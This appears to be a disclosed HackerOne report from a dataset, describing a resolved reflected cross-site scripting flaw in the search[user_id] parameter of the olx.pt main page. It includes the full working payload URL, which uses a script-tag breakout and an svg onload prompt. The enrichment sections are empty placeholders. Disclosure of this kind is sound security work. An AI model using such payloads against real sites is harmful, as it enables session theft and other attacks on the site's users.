---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '477771'
original_report_id: '477771'
title: XSS - main page - search[user_id] parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: olx
created_at: '2019-01-10T20:59:48.239Z'
disclosed_at: '2019-03-03T19:22:40.174Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 137
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS - main page - search[user_id] parameter

## Metadata

- HackerOne Report ID: 477771
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: olx
- Disclosed At: 2019-03-03T19:22:40.174Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi, how you doing?

This is a pretty straight foward XSS in the main page.

Affected parameter: search[user_id]

Direct Link:
https://www.olx.pt/braga/?search[user_id]=1zqjeu'"(){}<x>:/1zqjeu;9</SCript><svG/onLoad=prompt(9)>, ;prompt(9);&view=galleryWide

Tested in updated firefox.

## Impact

XSS allows a intruder to inject html and client side scripts in the browser of a victim, allowing for example the stealing of session cookies etc etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
